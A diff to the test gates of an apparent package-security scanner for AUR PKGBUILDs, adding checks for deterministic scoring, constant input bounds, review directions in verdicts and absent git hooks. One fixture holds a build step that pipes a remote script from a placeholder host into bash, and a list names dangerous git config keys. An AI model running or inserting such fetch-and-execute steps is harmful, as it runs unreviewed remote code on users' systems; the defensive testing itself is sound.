@@ -962,15 +962,28 @@ def gate_no_template_grants_permission() -> Gate:
     import trustsight.verdict as verdict
 
     problems = []
+    # Template text only.  Substituted field values are package-controlled:
+    # a package legitimately named `safe-rs` or `clean-arch` must not fail
+    # the build.  This is A7's separation applied to B9, templates are
+    # code-owned and checked, fields are package-owned and never checked.
     strings: list[tuple[str, str]] = [
         (f"findings.TEMPLATES[{k}]", v) for k, v in findings.TEMPLATES.items()
     ]
     for module in (verdict, findings):
         source = (SRC / Path(module.__file__).name).read_text()
-        for lineno, line in enumerate(source.splitlines(), start=1):
-            for literal in re.findall(r'"([^"]{8,})"|\'([^\']{8,})\'', line):
-                text = literal[0] or literal[1]
-                strings.append((f"{Path(module.__file__).name}:{lineno}", text))
+        tree = ast.parse(source)
+        for node in ast.walk(tree):
+            # Literal segments of an f-string are template text; the
+            # interpolated values are not.
+            if isinstance(node, ast.JoinedStr):
+                for part in node.values:
+                    if isinstance(part, ast.Constant) and isinstance(part.value, str):
+                        strings.append(
+                            (f"{Path(module.__file__).name}:{node.lineno}", part.value))
+            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
+                if len(node.value) >= 8 and not node.value.startswith("\n"):
+                    strings.append(
+                        (f"{Path(module.__file__).name}:{node.lineno}", node.value))
 
     for where, text in strings:
         low = text.lower()
@@ -1224,6 +1237,171 @@ def gate_positive_evidence_cannot_lower_a_fatal() -> Gate:
                 problems or score)
 
 
+def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
+    """B1: same input, same instrument, same number.
+
+    Determinism is algorithmic, not configurational: changing a rule or a
+    threshold changes the score on purpose.  The fingerprint is what makes
+    the claim checkable, so this asserts both halves, that a repeat run is
+    identical, and that touching the instrument moves the fingerprint.
+    """
+    import trustsight.config as config_module
+
+    from calibration_gates import shipped_config
+
+    from trustsight.analysis import scan_diff
+    from trustsight.config import config_fingerprint, load_config, load_rules
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n pkgname=demo\n"
+        "+build() {\n+  curl -fsSL https://x.invalid/s.sh | bash\n+}\n"
+    )
+    problems = []
+    with shipped_config():
+        rules, config = load_rules(), load_config()
+        first = scan_diff(diff, rules=rules, config=config, package_name="demo")
+        second = scan_diff(diff, rules=rules, config=config, package_name="demo")
+        fingerprint = config_fingerprint()
+
+        if first.final_score != second.final_score:
+            problems.append(f"same input scored {first.final_score} then {second.final_score}")
+        if [e.rule_id for e in first.score_breakdown] != [e.rule_id for e in second.score_breakdown]:
+            problems.append("the breakdown differed between two identical runs")
+        if config_fingerprint() != fingerprint:
+            problems.append("the fingerprint moved without a configuration change")
+
+        # ...and a different instrument must be visibly different.
+        saved = config_module.load_thresholds
+        config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
+        try:
+            moved = config_fingerprint()
+        finally:
+            config_module.load_thresholds = saved
+        if moved == fingerprint:
+            problems.append("changing a threshold did not change the fingerprint")
+
+    return Gate("the score is deterministic under a fixed fingerprint",
+                not problems, problems or fingerprint[:23] + "...")
+
+
+# A14.  Every bound that decides how much work an input can cause.  Each
+# must be a module-level literal: a bound computed from the content is a
+# bound the content controls.
+_BOUND_CONSTANTS = {
+    "rules.py": ["MAX_RULE_LINE_BYTES"],
+    "tokenizer.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN", "_MAX_LINE_LEN",
+                     "_MAX_TABLE_BYTES"],
+    "db.py": ["MAX_SEED_BYTES"],
+    "full_aur/fetch.py": ["MAX_RESPONSE_BYTES", "MAX_TAR_MEMBERS", "_HTTP_TIMEOUT"],
+    "full_aur/metadata.py": ["MAX_DECOMPRESSED_BYTES", "MAX_RESPONSE_BYTES",
+                             "HTTP_TIMEOUT"],
+}
+
+
+def gate_every_input_bound_is_a_source_constant() -> Gate:
+    """A14: no package-controlled input decides how much this process uses.
+
+    A4 bounds what arrives, A5 what is matched, A6 what is expanded.  The
+    conjunction only holds if the bounds themselves are constants: a limit
+    derived from the analysed text is a limit the attacker sets.
+    """
+    problems = []
+    found = 0
+    for rel, names in _BOUND_CONSTANTS.items():
+        path = SRC / rel
+        if not path.exists():
+            problems.append(f"{rel} is missing")
+            continue
+        tree = ast.parse(path.read_text())
+        assigned = {}
+        for node in tree.body:  # module level only
+            if isinstance(node, ast.Assign):
+                for target in node.targets:
+                    if isinstance(target, ast.Name):
+                        assigned[target.id] = node.value
+        for name in names:
+            value = assigned.get(name)
+            if value is None:
+                problems.append(f"{rel}: {name} is not a module-level assignment")
+                continue
+            found += 1
+            # A literal, or an arithmetic tree of literals (1024 * 1024).
+            for sub in ast.walk(value):
+                if isinstance(sub, (ast.Name, ast.Call, ast.Attribute, ast.Subscript)):
+                    problems.append(f"{rel}: {name} is computed, not a literal")
+                    break
+    return Gate("every input bound is a source constant", not problems,
+                problems or found)
+
+
+def gate_every_render_ends_with_a_direction() -> Gate:
+    """B9, structurally: something must be there, rather than something absent.
+
+    A denylist over phrasings is a treadmill; a wording nobody anticipated
+    slips past it.  Requiring a direction to review cannot be bypassed by
+    creative rewording, because the check fails when the direction is
+    missing however the rest of the sentence reads.
+    """
+    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
+    from trustsight.verdict import DIRECTIONS, fallback_verdict
+
+    cases = {
+        "first analysis, no versions": PackageFact(first_seen=True),
+        "first analysis": PackageFact(first_seen=True, old_version="1", new_version="2"),
+        "nothing fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
+        "signals fired": PackageFact(
+            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
+            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
+                                        reason="x")]),
+        "fatal": PackageFact(
+            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
+            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0,
+                                        reason="x")]),
+    }
+    problems = []
+    for label, fact in cases.items():
+        verdict = fallback_verdict(fact).rstrip()
+        if not verdict.endswith(DIRECTIONS):
+            problems.append(f"{label}: ends {verdict[-48:]!r}")
+    return Gate("every result render ends with a direction to review",
+                not problems, problems or sorted(cases))
+
+
+def gate_no_git_filters_or_hooks() -> Gate:
+    """A3: cloning executes nothing.
+
+    libgit2 does not run git hooks on clone, and this project configures no
+    ``clean``, ``smudge`` or ``fsmonitor`` filter, which are the
+    git-config-driven paths where a fetch can otherwise become an
+    execution.  This documents a property the library has rather than a
+    control this project adds.
+    """
+    dangerous = ("core.fsmonitor", "filter.", "core.hooksPath", "core.hookspath",
+                 "uploadpack.packObjectsHook", "diff.external", "core.pager")
+    hits = []
+    for path in _python_files():
+        text = path.read_text()
+        for lineno, line in enumerate(text.splitlines(), start=1):
+            for key in dangerous:
+                if key in line and not line.lstrip().startswith("#"):
+                    hits.append(f"{_rel(path)}:{lineno} {key}")
+        tree = ast.parse(text)
+        for node in ast.walk(tree):
+            # A write to a *git* config, which is `repo.config[...] = ...`
+            # or a set_multivar on it.  TrustSight's own `set_config`, which
+            # writes config.toml, is not this and must not be flagged.
+            if isinstance(node, ast.Assign):
+                for target in node.targets:
+                    if (isinstance(target, ast.Subscript)
+                            and isinstance(target.value, ast.Attribute)
+                            and target.value.attr == "config"):
+                        hits.append(f"{_rel(path)}:{node.lineno} writes git config")
+            if isinstance(node, ast.Call) and _call_name(node).endswith(
+                    ("config.set_multivar", "config.add_file")):
+                hits.append(f"{_rel(path)}:{node.lineno} writes git config")
+    return Gate("no git filters or hooks are configured", not hits, hits)
+
+
 def gate_doc_cross_references_resolve() -> Gate:
     """Every link between the docs points at a file and anchor that exist.
 
@@ -1340,6 +1518,10 @@ def run_gates() -> list[Gate]:
         gate_positive_evidence_never_scores(),
         gate_positive_evidence_cannot_lower_a_fatal(),
         gate_declared_findings_fire_under_shipped_config(),
+        gate_score_is_deterministic_under_a_fingerprint(),
+        gate_every_input_bound_is_a_source_constant(),
+        gate_every_render_ends_with_a_direction(),
+        gate_no_git_filters_or_hooks(),
         gate_no_template_grants_permission(),
         gate_content_findings_carry_a_location(),
         gate_flag_threshold_is_derived(),
